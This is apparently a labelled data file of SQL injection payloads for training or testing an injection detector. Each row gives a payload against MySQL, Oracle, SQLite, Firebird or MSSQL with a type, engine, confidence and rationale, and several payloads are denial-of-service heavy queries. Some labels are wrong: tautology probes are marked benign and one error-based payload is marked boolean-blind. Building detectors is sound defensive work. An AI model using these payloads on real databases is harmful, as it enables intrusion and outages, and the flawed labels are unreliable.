id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1,1' ) ) rlike sleep ( 5 ) and ( ( 'qitl' like 'qitl,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
2,"1' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( 'ggiw' = 'ggiw",heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
3,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
4,1' ) and 1987 = 3756#,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
5,-9024 ) where 1686 = 1686 or 3069 = 8213--,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
6,-5995' ) ) or 6872 = 6872 and ( ( 'pywh' = 'pywh,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
7,1 ) ) as oqui where 3368 = 3368 order by 1--,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",2
8,"1%"" ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
9,"1' ) as xagu where 9088 = 9088 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
10,1' in boolean mode ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
11,"-4543"" ) or 3038 = 3038",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
12,1 ) where 3381 = 3381,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",2
13,"-6160' ) ) ) or make_set ( 1924 = 4415,4415 ) and ( ( ( 'hayr' = 'hayr",boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: -6160' ) ) ) or make...,2
14,1 or sleep ( 5 ),time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
15,1'+ ( select cxvy where 7421 = 7421,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",1
16,"-1439"" or 2849 = 8484 and ""pmdl"" = ""pmdl",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
17,1 ) ) as wrhe where 6120 = 6120 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,boolean_blind,firebird,0.9,Firebird metadata table 'rdb$database' or 'rdb$fields' used in boolean-based blind injection.,3
18,"-8425"" ) ) or ( 6485 = 1127 ) *1127 and ( ( ""qruf"" = ""qruf",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,2
19,"1"" ) as drrx where 8633 = 8633 union all select null,null,null--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
20,"1%"" ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( ""%"" = """,heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
21,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = """,time_blind,sqlite,0.9,"'randomblob(N)' with a large N creates a processing delay in SQLite, used for time-based blind SQLi.",2
22,-8701%' ) ) or ( 4843 = 1690 ) *1690 and ( ( '%' = ',boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,2
23,"1' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'crus' = 'crus",boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: 1' ) ) ) or ( select...,2
24,"1"" and ( 3020 = 3020 ) *6703 and ""itpt"" = ""itpt",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,2
25,"1"" ) as upjw where 3880 = 3880 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,oracle,0.9,Oracle metadata table 'all_users' or 'all_tables' access attempted in a boolean context for blind injection.,3
26,"1"" ) where 3943 = 3943 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,'dbms_pipe.receive_message' is an Oracle-specific function often used for time-based blind injection.,3
27,-6777%' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( '%' = ',boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
28,1' ) as uwmy where 6980 = 6980,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",2
29,"-4972' ) ) as kfzc where 8817 = 8817 union all select 8817,8817,8817,8817,8817,8817--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
30,"-2333' union all select 9714,9714,9714--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
31,"1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'ujcx' = 'ujcx",boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: 1' ) ) ) and elt ( 4...,2
32,"1"" and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,oracle,0.9,Oracle metadata table 'all_users' or 'all_tables' access attempted in a boolean context for blind injection.,3
33,"1"" ) ) ) union all select null,null--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
34,"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ""onsd"" like ""onsd",time_blind,mysql,0.9,'benchmark()' function detected; used in MySQL to create time delays for blind injection.,1
35,"1 ) ) as rcon where 8190 = 8190 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,oracle,0.9,Oracle metadata table 'all_users' or 'all_tables' access attempted in a boolean context for blind injection.,3
36,"-2864' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'vjbl' = 'vjbl",error_based,mssql,0.9,"Type conversion error (e.g., 'convert(int, ...)') used to leak data in error-based SQLi.",1
